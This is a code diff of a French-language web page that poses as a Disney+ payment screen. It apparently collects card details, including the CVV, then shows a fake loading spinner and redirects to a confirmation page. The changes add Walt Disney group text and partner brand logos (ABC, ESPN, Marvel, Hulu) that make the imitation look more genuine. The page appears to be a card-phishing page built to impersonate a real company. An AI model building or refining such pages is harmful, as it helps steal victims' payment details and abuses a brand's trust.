@@ -1,115 +1,5 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Paiement | Disney+</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial, Helvetica, sans-serif;
-      background: radial-gradient(circle at top, #003264 0%, #032541 100%);
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
+<!-- ... garde ton head tel quel ... -->
 
-    .logo {
-      margin-top: 40px;
-      width: 140px;
-    }
-
-    main {
-      background-color: #fff;
-      color: #000;
-      max-width: 500px;
-      width: 100%;
-      border-radius: 20px;
-      padding: 40px 30px;
-      margin: 30px 20px;
-      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
-    }
-
-    h1 {
-      text-align: center;
-      font-size: 1.6rem;
-      margin-bottom: 24px;
-    }
-
-    form {
-      display: flex;
-      flex-direction: column;
-      gap: 18px;
-    }
-
-    input {
-      padding: 14px;
-      font-size: 1rem;
-      border-radius: 6px;
-      border: none;
-      background-color: #f0f0f0;
-      box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.1);
-    }
-
-    button {
-      margin-top: 10px;
-      padding: 14px;
-      background-color: #000;
-      color: #fff;
-      font-weight: bold;
-      font-size: 1rem;
-      border: none;
-      border-radius: 999px;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-    }
-
-    button:hover {
-      background-color: #333;
-    }
-
-    @media (max-width: 480px) {
-      .logo {
-        width: 110px;
-        margin-top: 30px;
-      }
-
-      main {
-        padding: 30px 20px;
-      }
-
-      h1 {
-        font-size: 1.4rem;
-      }
-    }
-
-    /* Spinner Overlay */
-    #spinnerOverlay {
-      position: fixed;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.9);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 9999;
-      display: none;
-    }
-
-    .spinner {
-      width: 70px;
-      height: 70px;
-      border: 8px solid rgba(255, 255, 255, 0.1);
-      border-top: 8px solid #00bfff;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-  </style>
-</head>
 <body>
 
   <img src="Images/compose2.png" alt="Disney+" class="logo" />
@@ -124,6 +14,22 @@
       <input type="text" placeholder="Cryptogramme (CVV)" required />
       <button type="submit">Valider le paiement</button>
     </form>
+
+    <!-- Logos partenaires -->
+    <div class="footer-note" style="margin-top: 30px; font-size: 0.75rem; color: #444; text-align: left; line-height: 1.4;">
+      <strong>Disney+ fait partie des entreprises du groupe Walt Disney</strong><br />
+      MyDisney vous permet d'accéder facilement aux différents services du groupe, comme Disney+, ESPN, Walt Disney World <a href="#">et bien +</a>.
+
+      <div class="logos-container" style="display: flex; flex-wrap: wrap; justify-content: center; align-items: center; gap: 14px; margin-top: 14px;">
+        <img src="Images/compose2.png" alt="Disney+" style="height: 22px; opacity: 0.7; filter: grayscale(100%);" />
+        <img src="Images/abc-logo-image-4413.png" alt="ABC" style="height: 22px; opacity: 0.7; filter: grayscale(100%);" />
+        <img src="Images/espn-png-logo-4149.png" alt="ESPN" style="height: 22px; opacity: 0.7; filter: grayscale(100%);" />
+        <img src="Images/marvel-logo-34291.png" alt="Marvel" style="height: 22px; opacity: 0.7; filter: grayscale(100%);" />
+        <img src="Images/star-wars-logo-1002.png" alt="Star Wars" style="height: 22px; opacity: 0.7; filter: grayscale(100%);" />
+        <img src="Images/Hulu-Logo-PNG.png" alt="Hulu" style="height: 22px; opacity: 0.7; filter: grayscale(100%);" />
+        <img src="Images/natgeo-logo.png" alt="National Geographic" style="height: 22px; opacity: 0.7; filter: grayscale(100%);" />
+      </div>
+    </div>
   </main>
 
   <!-- Spinner -->
@@ -137,11 +43,9 @@
       document.getElementById("spinnerOverlay").style.display = "flex";
 
       setTimeout(() => {
-        // À personnaliser selon la dernière étape
         window.location.href = "confirmation.html";
       }, 2500);
     });
   </script>
 
 </body>
-</html>
